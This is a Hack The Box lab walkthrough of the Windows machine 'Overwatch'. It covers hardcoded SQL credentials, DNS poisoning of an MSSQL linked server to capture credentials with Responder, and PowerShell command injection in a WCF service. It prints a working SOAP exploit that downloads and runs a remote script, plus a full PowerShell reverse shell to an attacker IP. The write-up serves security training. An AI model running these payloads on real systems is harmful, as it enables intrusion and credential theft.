---
categories:
- Hackthebox
image:
  path: overwatch.png
layout: post
media_subpath: /assets/images/overwatch
tags:
- hackthebox
- writeup
- windows
- active-directory
- wcf
- dns-spoofing
- mssql
- linked-servers
- responder
- ilspy
- dotnet
- hard
title: HTB - Overwatch Walkthrough
---

## Introduction
Overwatch is a medium-difficulty Windows machine that requires multiple advanced techniques including DNS record manipulation, MSSQL linked server abuse, credential harvesting via Responder, and finally exploiting a vulnerable WCF (Windows Communication Foundation) service through command injection. The attack path demonstrates lateral movement from a low-privileged SQL service account to SYSTEM through a poorly coded .NET service.

## Reconnaissance
### Port Scanning

Initial `nmap` scan reveals a Windows domain controller with standard AD services:

```
nmap -sCV -oA nmap/Overwatch 10.129.48.126
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 05:24 -0400
Nmap scan report for 10.129.48.126
Host is up (0.16s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-06 09:25:03Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-06T09:25:55+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-06T09:25:15+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-06T09:25:17
|_  start_date: N/A
|_clock-skew: mean: 6s, deviation: 0s, median: 5s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.85 seconds
```

**Key Findings:**

- Domain: `overwatch.htb`
- Hostname: `S200401.overwatch.htb`
- WinRM enabled on port 5985
- RDP available on port 3389

Add domain to hosts file:

```
echo '10.129.48.126   S200401.overwatch.htb overwatch.htb S200401' | sudo tee -a /etc/hosts
```

## SMB Enumeration

Guest SMB access reveals a non-default share `software$`:

```
nxc smb overwatch.htb -u 'guest' -p '' --shares
SMB         10.129.48.126   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.48.126   445    S200401          [+] overwatch.htb\guest: 
SMB         10.129.48.126   445    S200401          [*] Enumerated shares
SMB         10.129.48.126   445    S200401          Share           Permissions     Remark
SMB         10.129.48.126   445    S200401          -----           -----------     ------
SMB         10.129.48.126   445    S200401          ADMIN$                          Remote Admin
SMB         10.129.48.126   445    S200401          C$                              Default share
SMB         10.129.48.126   445    S200401          IPC$            READ            Remote IPC
SMB         10.129.48.126   445    S200401          NETLOGON                        Logon server share 
SMB         10.129.48.126   445    S200401          software$       READ            
SMB         10.129.48.126   445    S200401          SYSVOL                          Logon server share
```

Connecting to the share and downloading its contents:

```
smbclient.py 'overwatch.htb/guest:'@10.129.48.126 -no-pass
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use software$
# ls
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 .
drw-rw-rw-          0  Thu Jan  1 01:46:47 2026 ..
drw-rw-rw-          0  Tue Jan  6 06:25:34 2026 Monitoring
# cd Monitoring
# mget *
[*] Downloading EntityFramework.dll
[*] Downloading EntityFramework.SqlServer.dll
[*] Downloading EntityFramework.SqlServer.xml
[*] Downloading EntityFramework.xml
[*] Downloading Microsoft.Management.Infrastructure.dll
[*] Downloading overwatch.exe
[*] Downloading overwatch.exe.config
[*] Downloading overwatch.pdb
[*] Downloading System.Data.SQLite.dll
[*] Downloading System.Data.SQLite.EF6.dll
[*] Downloading System.Data.SQLite.Linq.dll
[*] Downloading System.Data.SQLite.xml
[*] Downloading System.Management.Automation.dll
[*] Downloading System.Management.Automation.xml
#
```

**Downloaded Files Include:**

- `overwatch.exe` - Main executable
    
- `overwatch.exe.config` - Configuration file
    
- `EntityFramework.dll` - ORM framework
    
- `System.Management.Automation.dll` - PowerShell integration
    
- Various SQLite and SQL Server related DLLs
    

## Configuration Analysis

The `overwatch.exe.config` file reveals critical information:

```
cat overwatch.exe.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
    <!-- For more information on Entity Framework configuration, visit http://go.microsoft.com/fwlink/?LinkID=237468 -->
    <section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
  </configSections>
  <system.serviceModel>
    <services>
      <service name="MonitoringService">
        <host>
          <baseAddresses>
            <add baseAddress="http://overwatch.htb:8000/MonitorService" />
          </baseAddresses>
        </host>
        <endpoint address="" binding="basicHttpBinding" contract="IMonitoringService" />
        <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
      </service>
    </services>
    <behaviors>
      <serviceBehaviors>
        <behavior>
          <serviceMetadata httpGetEnabled="True" />
          <serviceDebug includeExceptionDetailInFaults="True" />
        </behavior>
      </serviceBehaviors>
    </behaviors>
  </system.serviceModel>
  <entityFramework>
    <providers>
      <provider invariantName="System.Data.SqlClient" type="System.Data.Entity.SqlServer.SqlProviderServices, EntityFramework.SqlServer" />
      <provider invariantName="System.Data.SQLite.EF6" type="System.Data.SQLite.EF6.SQLiteProviderServices, System.Data.SQLite.EF6" />
    </providers>
  </entityFramework>
  <system.data>
    <DbProviderFactories>
      <remove invariant="System.Data.SQLite.EF6" />
      <add name="SQLite Data Provider (Entity Framework 6)" invariant="System.Data.SQLite.EF6" description=".NET Framework Data Provider for SQLite (Entity Framework 6)" type="System.Data.SQLite.EF6.SQLiteProviderFactory, System.Data.SQLite.EF6" />
    <remove invariant="System.Data.SQLite" /><add name="SQLite Data Provider" invariant="System.Data.SQLite" description=".NET Framework Data Provider for SQLite" type="System.Data.SQLite.SQLiteFactory, System.Data.SQLite" /></DbProviderFactories>
  </system.data>
</configuration>
```

**Important Discoveries:**

- A WCF service running on port 8000
    
- Service name: `MonitoringService`
    
- Endpoint: `http://overwatch.htb:8000/MonitorService`
    
- Uses `basicHttpBinding` (SOAP over HTTP)

## Binary Analysis

### Identifying the Service Type

The file is a .NET executable:

```
file overwatch.exe
overwatch.exe: PE32+ executable for MS Windows 6.00 (console), x86-64 Mono/.Net assembly, 2 sections
```

### Technical Concept: Windows Communication Foundation (WCF)

**WCF** is Microsoft's framework for building service-oriented applications. Key characteristics:

- **Service Contract**: Defines operations exposed by the service (`[ServiceContract]`)
- **Operation Contract**: Individual methods clients can call (`[OperationContract]`)
- **Data Contract**: Defines data structures passed between client and service 
- **Endpoint**: Combines address, binding, and contract
    

### Decompiling with mono
```
monodis --output=../overwatch overwatch.exe
```

### Finding Credentials in Decompiled Code

```
grep Pass overwatch                                                                                                        
        IL_0001:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
            IL_0029:  ldstr "Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
```

These credentials are for a local SQL Server instance.

## SQL Server Discovery

### Full Port Scan Reveals SQL Instance

A comprehensive port scan reveals SQL Server on a non-standard port:

```
nmap -p-  --open -oA nmap/all-ports 10.129.48.126                                                                                                                                                                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 05:53 -0400
Nmap scan report for S200401.overwatch.htb (10.129.48.126)
Host is up (0.19s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
6520/tcp  open  unknown
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
50757/tcp open  unknown
52862/tcp open  unknown
52863/tcp open  unknown
62274/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 668.82 seconds

cat nmap/all-ports.nmap | grep open | awk 'NR > 1' | awk -F / '{print $1}' ORS=','
53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49668,50757,52862,52863,62274,


 nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389,49664,49668,52299,56770,56792,60201,60202,62127 -sCV -oA nmap/targeted 10.129.48.126 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-06 06:06 -0400
Nmap scan report for S200401.overwatch.htb (10.129.48.126)
Host is up (0.16s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-06 10:06:45Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=S200401.overwatch.htb
| Not valid before: 2025-12-07T15:16:06
|_Not valid after:  2026-06-08T15:16:06
| rdp-ntlm-info: 
|   Target_Name: OVERWATCH
|   NetBIOS_Domain_Name: OVERWATCH
|   NetBIOS_Computer_Name: S200401
|   DNS_Domain_Name: overwatch.htb
|   DNS_Computer_Name: S200401.overwatch.htb
|   DNS_Tree_Name: overwatch.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-06T10:07:36+00:00
|_ssl-date: 2026-05-06T10:08:16+00:00; +6s from scanner time.
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6520/tcp  open     ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
|_ssl-date: 2026-05-06T10:08:16+00:00; +6s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.48.126:6520: 
|     Target_Name: OVERWATCH
|     NetBIOS_Domain_Name: OVERWATCH
|     NetBIOS_Computer_Name: S200401
|     DNS_Domain_Name: overwatch.htb
|     DNS_Computer_Name: S200401.overwatch.htb
|     DNS_Tree_Name: overwatch.htb
|_    Product_Version: 10.0.20348
| ms-sql-info: 
|   10.129.48.126:6520: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 6520
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-05-06T09:25:21
|_Not valid after:  2056-05-06T09:25:21
9389/tcp  open     mc-nmf        .NET Message Framing
49664/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
52299/tcp filtered unknown
56770/tcp filtered unknown
56792/tcp filtered unknown
60201/tcp filtered unknown
60202/tcp filtered unknown
62127/tcp filtered unknown
Service Info: Host: S200401; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6s, deviation: 0s, median: 5s
| smb2-time: 
|   date: 2026-05-06T10:07:37
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.10 seconds
```

### MSSQL Authentication

The discovered credentials work for MSSQL:

```
nxc mssql overwatch.htb -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --port 6520
MSSQL       10.129.48.126   6520   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) (EncryptionReq:False)
MSSQL       10.129.48.126   6520   S200401          [+] overwatch.htb\sqlsvc:TI0LKcfHzZw1Vv
```

However, the user only has `guest` permissions:

```
mssqlclient.py 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv'@10.129.48.126  -port 6520 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)>
```

I didn't anything from enumerating the custom database `overwatch`

```
SQL (OVERWATCH\sqlsvc  guest@master)> enum_db
name        is_trustworthy_on   
---------   -----------------   
master                      0   
tempdb                      0   
model                       0   
msdb                        1   
overwatch                   0   
SQL (OVERWATCH\sqlsvc  guest@master)> use overwatch
ENVCHANGE(DATABASE): Old Value: master, New Value: overwatch
INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'overwatch'.
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> SELECT * FROM information_schema.tables
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME   TABLE_TYPE   
-------------   ------------   ----------   ----------   
overwatch       dbo            Eventlog     b'BASE TABLE'   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)>  SELECT * FROM Eventlog
Id   Timestamp   EventType   Details   
--   ---------   ---------   -------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)>
```

### Enumerating Linked Servers

```
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------   
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL      
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL      
Linked Server   Local Login   Is Self Mapping   Remote Login   
-------------   -----------   ---------------   ------------   
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> 
```

**Technical Concept: MSSQL Linked Servers**

Key characteristics of this configuration:

- **Self Mapping enabled**: Current credentials are passed to the remote server
- **SQLNCLI Provider**: Uses SQL Server Native Client
- **No explicit credentials**: Relies on Kerberos/NTLM authentication
- **DNS dependency**: `SQL07` must resolve to a reachable host
    

## DNS Spoofing Attack

### Technical Concept: DNS Record Manipulation

Since the SQL server relies on DNS resolution for `SQL07`, we can add a DNS record pointing to our attack machine. When the SQL server attempts to authenticate, it will send NTLM authentication to our listener.

### Adding DNS Record with bloodyAD

```
bloodyAD -d overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv --host 10.129.48.126 add dnsRecord SQL07 10.10.14.216
[+] SQL07 has been successfully added
```

**What this does:**

- Adds an `A` record for `SQL07` in the Active Directory DNS
- Points it to our attacker IP (10.10.14.216)
- The SQL server will now resolve `SQL07` to our machine
    

### Capturing Credentials with Responder

Start Responder to listen for incoming authentication attempts:

```
 sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


<.....SNIP.....>
[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...

```

Trigger the linked server query to force authentication:

```
mssqlclient.py 'overwatch.htb/sqlsvc:TI0LKcfHzZw1Vv'@10.129.48.140  -port 6520 -windows-auth                                                                                                                                            
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (OVERWATCH\sqlsvc  guest@master)> EXEC ('SELECT 1') AT [SQL07]
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Communication link failure".
ERROR(MSOLEDBSQL): Line 0: TCP Provider: An existing connection was forcibly closed by the remote host.

SQL (OVERWATCH\sqlsvc  guest@master)>
```

**Captured Credentials:**

```
[+] Listening for events...

[MSSQL] Cleartext Client   : 10.129.48.126
[MSSQL] Cleartext Hostname : SQL07 ()
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

### WinRM Access

The captured credentials work for WinRM:

```
nxc winrm overwatch.htb -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'                             
WINRM       10.129.48.140   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.48.140   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)

```


```
evil-winrm -i overwatch.htb  -u 'sqlmgmt' -p 'bIhBbzMMnB82yx'          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents>
```

**User flag:** `C:\Users\sqlmgmt\Desktop\user.txt`

# Privilege Escalation

We don't have any interesting privileges

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents>
```

## WCF Service Exploitation

### Service Discovery

Confirming the WCF service is running:

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> netstat -aon | findstr :8000
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    [::]:8000              [::]:0                 LISTENING       4
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents>
```

### Port Forwarding with Chisel

Since port 8000 is only accessible locally, we need to forward it:

**On Attack Host:**

```
chisel server -p 4444 --reverse
2026/05/06 13:04:26 server: Reverse tunnelling enabled
2026/05/06 13:04:26 server: Fingerprint +tlurrfZbeHQ9N1N3u57+aD9NmtKh4APIA0Y0/m6i5E=
2026/05/06 13:04:26 server: Listening on http://0.0.0.0:4444
```

**On Victim (via WinRM):**

```
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd /programdata
*Evil-WinRM* PS C:\programdata> wget http://10.10.14.216:8000/chisel.exe -o chisel.exe
*Evil-WinRM* PS C:\programdata> .\chisel.exe client 10.10.14.216:4444 R:8000:127.0.0.1:8000
```

Now we can access the service from our attack host.

### Analyzing the WCF Service with ILSpy/dnSpy

**Technical Concept: ILSpy/dnSpy**

ILSpy is a .NET decompiler that can reconstruct C# source code from compiled assemblies. This is essential for analyzing the service's functionality and finding vulnerabilities.

**Loading the executable in ILSpy:**

![img](Pasted image 20260506122617.png)

### Service Interface Discovery

The decompiled code reveals three methods:

```csharp
[ServiceContract]
public interface IMonitoringService
{
    [OperationContract]
    void StartMonitoring();
    
    [OperationContract]
    void StopMonitoring();
    
    [OperationContract]
    void KillProcess(string processName);
}
```

### Vulnerability Analysis - KillProcess Method

**Decompiled Code:**

![img](Pasted image 20260506122723.png)

```csharp
public void KillProcess(string processName)
{
    // CRITICAL VULNERABILITY: No input validation
    // Direct concatenation into PowerShell command
    string command = "Get-Process -Name " + processName + " | Stop-Process -Force";
    
    // Executes with the service's privileges (likely SYSTEM)
    using (PowerShell ps = PowerShell.Create())
    {
        ps.AddScript(command);
        ps.Invoke();
    }
}
```

**The Flaw Explained:**

1. **No Input Sanitization**: The `processName` parameter is directly concatenated into a PowerShell command string
2. **Command Injection**: Attackers can use PowerShell operators to inject arbitrary commands
3. **Semi-colon injection**: In PowerShell, semi-colons (`;`) separate commands
4. **High Privilege Execution**: The serviceuns with elevated privileges (lik rely SYSTEM)
    

### Crafting the Exploit Payload

```python
import requests

target_url = "http://127.0.0.1:8000/MonitorService"
callback_ip = "10.10.14.216"  # Your listener IP

# The injection payload:
# Using semi-colon to chain commands in PowerShell
# Downloads and executes a reverse shell script
process_name = f"notepad; IEX(New-Object Net.WebClient).DownloadString('http://{callback_ip}/shell.ps1');#"

# WCF SOAP Envelope
soap_payload = f"""<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
        <KillProcess xmlns="http://tempuri.org/">
            <processName>{process_name}</processName>
        </KillProcess>
    </s:Body>
</s:Envelope>"""

headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": '"http://tempuri.org/IMonitoringService/KillProcess"'
}

response = requests.post(target_url, data=soap_payload, headers=headers)
```


**What the Payload Does:**

1. `notepad` - Valid process name to satisfy initial command
2. `;` - PowerShell command separator
3. `IEX(New-Object Net.WebClient).DownloadString(...)` - Downloads and executes PowerShell script
4. `#` - Comments out any remaining injected code
### Reverse Shell Payload (shell.ps1)

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.216',9001);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

### Executing the Exploit

Start listener:

```bash
rlwrap nc -nlvp 9001
```

Run the exploit script:

```bash
python3 exploit.py
```

**Obtained**

```
rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.216] from (UNKNOWN) [10.129.244.81] 55519

PS C:\Software\Monitoring> whoami
nt authority\system
PS C:\Software\Monitoring>
```

**Root flag:** `C:\Users\Administrator\Desktop\root.txt`

